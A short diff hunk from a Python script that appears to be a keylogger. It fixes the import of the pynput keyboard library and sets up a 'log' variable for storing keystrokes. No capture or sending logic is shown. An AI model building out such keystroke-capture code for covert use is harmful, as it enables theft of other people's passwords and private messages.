@@ -3,7 +3,7 @@
 #need pynput - not preinstalled
 #pip install pynput / pip3 install pynput
 
-import pyinput.keyboard
+import pynput.keyboard
 
 log = "" #init var for storing keystrokes
 
